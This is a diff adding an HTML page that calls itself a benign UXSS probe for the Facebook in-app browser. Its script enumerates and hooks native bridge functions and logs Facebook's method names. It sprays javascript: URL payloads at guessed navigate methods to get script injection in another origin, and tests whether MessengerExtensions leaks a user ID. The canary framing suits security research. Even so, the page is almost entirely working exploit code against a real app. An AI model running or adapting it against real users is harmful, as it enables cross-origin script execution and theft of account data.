@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>fb iab uxss all-in-one</title>
+<style>
+ body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;padding:12px;line-height:1.4;color:#111}
+ h1{font-size:16px}h2{font-size:12px;margin:12px 0 4px;color:#333}
+ pre{background:#f4f4f7;border:1px solid #dcdce2;border-radius:6px;padding:8px;font-size:10px;white-space:pre-wrap;word-break:break-all}
+ button{font-size:13px;padding:10px;width:100%;border:1px solid #dcdce2;border-radius:8px;background:#fff;margin:4px 0;text-align:left}
+ input{width:100%;padding:9px;font-size:15px;border:1px solid #dcdce2;border-radius:8px;margin:4px 0}
+ .warn{color:#b23;font-size:11px}
+ #uxss{display:none;background:#c0392b;color:#fff;padding:12px;border-radius:6px;font-weight:700}
+ .big{height:150vh;background:linear-gradient(#fff,#eee)}
+</style>
+</head>
+<body>
+<h1>FB in-app browser — UXSS all-in-one (benign)</h1>
+<p style="font-size:12px;color:#666">Open inside the FACEBOOK app in-app browser (post/DM the link, tap).
+Auto-recon + hooks + MessengerExtensions check; buttons attempt a benign UXSS canary via discovered
+navigate methods. Canary only flips a flag — reads no data.</p>
+
+<div id="uxss">⚠ UXSS CANARY EXECUTED — ran as document.domain=<span id="ud"></span></div>
+
+<h2>environment</h2><pre id="env"></pre>
+<h2>bridges / globals / MessengerExtensions</h2><pre id="br"></pre>
+<h2>live bridge calls FB makes (interact below)</h2><pre id="log"></pre>
+
+<h2>attempt UXSS</h2>
+<button onclick="tryME()">1 · scan + call MessengerExtensions (read-only + close)</button>
+<button onclick="tryNav()">2 · call common navigate methods with javascript: canary</button>
+<p>custom unified-bridge call: method / payload(JSON)</p>
+<input id="m" placeholder="method (e.g. openURL)">
+<input id="pl" placeholder='payload JSON (e.g. {"url":"javascript:__UXSS(\'x\')"})'>
+<button onclick="tryCustom()">3 · call __call_iabjs_unified_bridge(method,nonce,payload)</button>
+
+<button onclick="interact()">simulate interaction (reveal FB method names)</button>
+<p>scroll to trigger FB bridge:</p><div class="big"></div>
+<p class="warn">Benign canary only. Buttons call native bridges — use on your own device.</p>
+
+<script>
+function g(id){return document.getElementById(id);}
+var L=g('log'); function log(m){try{L.textContent=m+'\n'+L.textContent;}catch(e){}}
+function safe(x){try{return JSON.stringify(x).slice(0,500);}catch(e){try{return String(x).slice(0,300);}catch(_){return '(unser)';}}}
+function keys(o){try{return Object.getOwnPropertyNames(o).join(', ');}catch(e){return '(err)';}}
+function nonce(){try{return window.__iabjs_unified_bridge_nonce||'unused';}catch(e){return 'unused';}}
+
+// UXSS canary — any executed javascript: payload calls this
+window.__UXSS=function(w){try{g('ud').textContent=document.domain+' ('+(w||'')+')';g('uxss').style.display='block';document.title='UXSS';log('*** UXSS CANARY FIRED from '+(w||'?')+' domain='+docum
+ent.domain+' ***');}catch(e){}};
+
+// env
+try{ g('env').textContent=
+ 'UA='+navigator.userAgent+'\n'+
+ 'FB app='+/FBAN|FBAV|FB_IAB/i.test(navigator.userAgent)+'  IG='+/Instagram/i.test(navigator.userAgent)+'\n'+
+ 'origin='+location.origin+'\n'+
+ 'iabjs_unified_bridge='+typeof window.iabjs_unified_bridge+'  __call_iabjs_unified_bridge='+typeof window.__call_iabjs_unified_bridge+'\n'+
+ 'webkit.messageHandlers='+((window.webkit&&window.webkit.messageHandlers)?'present':'absent')+'\n'+
+ 'MessengerExtensions='+typeof window.MessengerExtensions+'  nonce='+nonce();
+}catch(e){g('env').textContent='env err '+e;}
+
+// bridges / globals / MessengerExtensions
+try{
+ var out=[];
+ var markers=['MessengerExtensions','_FB','FB','FBRPC','_FBNativeBridge','iabjs_unified_bridge','__call_iabjs_unified_bridge','_AutofillCallbackHandler','_pcmBridgeCallbackHandler','__iabjs','_MET
+A','browserDeclutter'];
+ markers.forEach(function(n){try{ if(typeof window[n]!=='undefined'){ out.push(n+' = '+typeof window[n]+(typeof window[n]==='object'&&window[n]?' { '+keys(window[n]).slice(0,160)+' }':(typeof wind
+ow[n]==='function'?' ['+String(window[n]).slice(0,100).replace(/\s+/g,' ')+'…]':''))); } }catch(e){}});
+ // enumerate non-standard window globals briefly
+ var extra=[]; for(var k in window){try{ if(/bridge|iab|fb|messenger|native|autofill|rpc/i.test(k) && markers.indexOf(k)<0){ extra.push(k+':'+typeof window[k]); } }catch(e){}}
+ if(extra.length) out.push('other: '+extra.join(', '));
+ g('br').textContent=out.length?out.join('\n'):'(none)';
+}catch(e){g('br').textContent='err '+e;}
+
+// hook unified bridge + callbacks to log FB's real method names
+try{ if(typeof window.__call_iabjs_unified_bridge==='function'){ var o=window.__call_iabjs_unified_bridge;
+ window.__call_iabjs_unified_bridge=function(method,n,p){ log('BRIDGE CALL method='+method+' payload='+safe(p)); try{return o.apply(this,arguments);}catch(e){log('orig err '+e);} };
+ log('hooked __call_iabjs_unified_bridge'); } }catch(e){log('hook err '+e);}
+['_AutofillCallbackHandler','_pcmBridgeCallbackHandler'].forEach(function(nm){try{if(typeof window[nm]==='function'){var o=window[nm];window[nm]=function(){log('CB '+nm+' <= '+safe([].slice.call(a
+rguments)));try{return o.apply(this,arguments);}catch(e){}};}}catch(e){}});
+
+// 1 — MessengerExtensions
+function tryME(){
+ try{
+  if(typeof window.MessengerExtensions==='undefined'){ log('MessengerExtensions absent'); return; }
+  log('MessengerExtensions keys: '+keys(window.MessengerExtensions));
+  ['getContextType','getSupportedFeatures'].forEach(function(fn){ try{ if(typeof window.MessengerExtensions[fn]==='function'){ window.MessengerExtensions[fn](function(r){log('ME.'+fn+' ok: '+safe(
+r));},function(e){log('ME.'+fn+' err: '+safe(e));}); } }catch(e){log('ME.'+fn+' threw '+e);} });
+  try{ window.MessengerExtensions.getUserID(function(r){log('ME.getUserID OK: '+safe(r)+' (if this returns a UID to an arbitrary page = leak)');},function(e){log('ME.getUserID err: '+safe(e));});
+}catch(e){log('getUserID threw '+e);}
+ }catch(e){log('tryME err '+e);}
+}
+
+// 2 — common navigate methods with javascript: canary
+function tryNav(){
+ if(typeof window.__call_iabjs_unified_bridge!=='function'){ log('no unified bridge fn'); return; }
+ var methods=['openURL','openUrl','open','loadURL','loadUrl','navigate','navigateTo','openExternalURL','openInApp','openLink','setLocation','redirect'];
+ var payloads=[{url:'javascript:window.__UXSS&&__UXSS("nav")'}, 'javascript:window.__UXSS&&__UXSS("nav-str")', {uri:'javascript:__UXSS("uri")'}, {href:'javascript:__UXSS("href")'}];
+ methods.forEach(function(mth){ payloads.forEach(function(p){ try{ window.__call_iabjs_unified_bridge(mth, nonce(), p); log('tried '+mth+' <- '+safe(p)); }catch(e){ log('tried '+mth+' threw '+e);
+} }); });
+ log('— if UXSS CANARY fired above, that method navigated to javascript: in-context = UXSS —');
+}
+
+// 3 — custom
+function tryCustom(){
+ var mth=(g('m').value||'').trim(); var raw=(g('pl').value||'').trim(); if(!mth){log('enter method');return;}
+ var p; try{ p=raw?JSON.parse(raw):{}; }catch(e){ p=raw; }
+ try{ window.__call_iabjs_unified_bridge(mth, nonce(), p); log('custom called '+mth+' <- '+safe(p)); }catch(e){ log('custom threw '+e); }
+}
+
+function interact(){try{window.scrollTo(0,400);document.body.click();window.dispatchEvent(new Event('resize'));log('interacted');}catch(e){}}
+</script>
+</body>
+</html>
